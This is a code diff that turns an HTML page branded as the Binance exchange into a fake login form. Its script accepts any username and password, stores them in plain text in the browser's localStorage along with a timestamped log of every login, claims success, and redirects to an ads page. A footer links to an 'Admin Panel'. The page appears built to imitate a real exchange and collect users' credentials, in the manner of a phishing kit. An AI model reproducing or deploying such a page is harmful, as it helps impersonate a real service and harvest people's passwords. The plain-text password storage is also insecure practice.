@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance - Home</title>
+    <title>Binance - Login</title>
     <style>
         * {
             margin: 0;
@@ -13,20 +13,31 @@
         body {
             background: #000;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: white;
-        }
-        .header {
-            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             padding: 20px;
+        }
+        .login-container {
+            background: white;
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 600px;
+        }
+        .logo-section {
             text-align: center;
-            border-bottom: 2px solid #f3ba2f;
+            margin-bottom: 40px;
         }
         .logo {
-            font-size: 40px;
+            font-size: 50px;
             color: #f3ba2f;
+            margin-bottom: 10px;
         }
         .logo-text {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: bold;
             color: #f3ba2f;
             letter-spacing: 2px;
@@ -35,72 +46,163 @@
             color: #999;
             font-size: 14px;
             margin-top: 10px;
-        }
-        .container {
-            max-width: 800px;
-            margin: 50px auto;
-            padding: 30px;
-            text-align: center;
+            letter-spacing: 1px;
         }
         h1 {
-            font-size: 36px;
-            margin-bottom: 20px;
-            color: #f3ba2f;
-        }
-        p {
-            font-size: 16px;
-            color: #ccc;
+            text-align: center;
+            color: #000;
             margin-bottom: 30px;
-            line-height: 1.6;
+            font-size: 28px;
+            margin-top: 20px;
         }
-        .button-group {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-            flex-wrap: wrap;
+        .form-group {
+            margin-bottom: 20px;
         }
-        a {
-            padding: 15px 40px;
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #000;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+            background: #f8f9fa;
+        }
+        input:focus {
+            outline: none;
+            border-color: #f3ba2f;
+            background: #fff;
+        }
+        input::placeholder {
+            color: #999;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
             background: #f3ba2f;
             color: #000;
-            text-decoration: none;
+            border: none;
             border-radius: 8px;
-            font-weight: bold;
             font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
             transition: background 0.3s;
+            margin-top: 10px;
         }
-        a:hover {
+        button:hover {
             background: #e0a800;
         }
-        .admin-link {
-            background: #666;
-            color: white;
-            font-size: 12px;
-            padding: 10px 20px;
-            margin-top: 40px;
+        button:active {
+            transform: scale(0.98);
         }
-        .admin-link:hover {
-            background: #999;
+        .message {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            color: red;
+        }
+        .message.success {
+            color: green;
+        }
+        .footer-menu {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #111;
+            border-top: 2px solid #f3ba2f;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            flex-wrap: wrap;
+        }
+        .footer-menu a {
+            color: #f3ba2f;
+            text-decoration: none;
+            font-size: 12px;
+            padding: 10px 15px;
+            border-radius: 5px;
+            transition: background 0.3s;
+        }
+        .footer-menu a:hover {
+            background: #222;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">₿</div>
-        <div class="logo-text">BINANCE</div>
-        <div class="tagline">THE WORLD'S LEADING CRYPTO EXCHANGE</div>
-    </div>
-
-    <div class="container">
-        <h1>Welcome to Binance</h1>
-        <p>Trade cryptocurrencies with the world's most trusted exchange. Secure, fast, and reliable trading platform.</p>
-        
-        <div class="button-group">
-            <a href="login.html">Login</a>
-            <a href="ads.html">View Ads</a>
+    <div class="login-container">
+        <div class="logo-section">
+            <div class="logo">₿</div>
+            <div class="logo-text">BINANCE</div>
+            <div class="tagline">THE WORLD'S LEADING CRYPTO EXCHANGE</div>
         </div>
-
-        <a href="admin.html" class="admin-link">Admin Panel</a>
+        
+        <h1>Login</h1>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" placeholder="Enter username or email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter password" required>
+            </div>
+            <button type="submit">Login</button>
+            <div id="message" class="message"></div>
+        </form>
     </div>
+
+    <div class="footer-menu">
+        <a href="admin.html">Admin Panel</a>
+        <a href="customer-care.html">Customer Care</a>
+        <a href="fill-report.html">Fill Report</a>
+        <a href="feedback.html">Feedback</a>
+        <a href="settings.html">Settings</a>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const messageDiv = document.getElementById('message');
+            
+            if (username === '' || password === '') {
+                messageDiv.textContent = 'Please fill in all fields!';
+                messageDiv.style.color = 'red';
+                return;
+            }
+            
+            // Save login info
+            const loginTime = new Date().toLocaleString();
+            const loginId = 'login_' + Date.now();
+            
+            localStorage.setItem('loggedIn', 'true');
+            localStorage.setItem('username', username);
+            localStorage.setItem('password', password);
+            localStorage.setItem('loginTime', loginTime);
+            localStorage.setItem(loginId, JSON.stringify({
+                username: username,
+                password: password,
+                time: loginTime
+            }));
+            
+            messageDiv.textContent = 'Login successful! Redirecting...';
+            messageDiv.classList.add('success');
+            
+            // Redirect to ads page
+            setTimeout(() => {
+                window.location.href = 'ads.html';
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
